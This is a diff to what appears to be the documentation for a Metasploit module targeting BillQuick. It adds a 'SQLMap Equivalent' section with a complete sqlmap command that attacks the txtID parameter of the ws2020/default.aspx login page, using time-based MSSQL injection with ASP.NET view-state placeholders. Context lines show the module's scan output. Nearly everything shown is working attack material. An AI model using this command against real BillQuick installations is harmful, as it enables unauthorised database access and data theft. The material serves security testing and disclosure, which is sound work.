@@ -82,3 +82,11 @@ resource (billquick.rb)> exploit
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
+
+## SQLMap Equivalent
+
+You'll need a valid `VIEWSTATE`, `VIEWSTATEGENERATOR`, `EVENTVALIDATION`.
+
+```
+sqlmap -u "http://[IP]/ws2020/default.aspx" -f txtID --data="__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE=[VIEWSTATE]&__VIEWSTATEGENERATOR=[GENERATOR]&__EVENTVALIDATION=[VALIDATION]&txtID=a&txtPW=a&hdnClientDPI=96" --dbms MSSQL --time-sec 15 --batch
+```
